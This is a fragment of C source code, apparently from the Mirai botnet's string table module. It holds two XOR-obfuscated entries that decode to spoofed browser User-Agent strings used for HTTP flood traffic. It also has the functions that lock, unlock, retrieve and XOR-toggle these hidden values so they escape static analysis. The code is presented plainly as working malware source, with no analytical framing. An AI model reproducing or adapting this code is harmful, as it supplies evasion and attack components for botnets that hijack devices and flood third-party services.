    add_entry(TABLE_HTTP_THIRTY_SIX, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x13\x12\x0C\x12\x19\x02\x75\x4B\x4C\x14\x16\x19\x02\x5A\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x15\x12\x0C\x12\x0C\x11\x17\x11\x1A\x0C\x13\x12\x10\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x02\x67\x46\x45\x47\x0D\x13\x1A\x0C\x13\x1A\x11\x14\x10\x22", 130);
    add_entry(TABLE_HTTP_THIRTY_SEVEN, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x13\x12\x0C\x12\x19\x02\x75\x4B\x4C\x14\x16\x19\x02\x5A\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x1B\x10\x0C\x12\x0C\x16\x17\x13\x17\x0C\x13\x11\x13\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x02\x6D\x72\x70\x0D\x15\x1A\x0C\x12\x0C\x16\x12\x1B\x11\x0C\x10\x13\x16\x22", 134);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
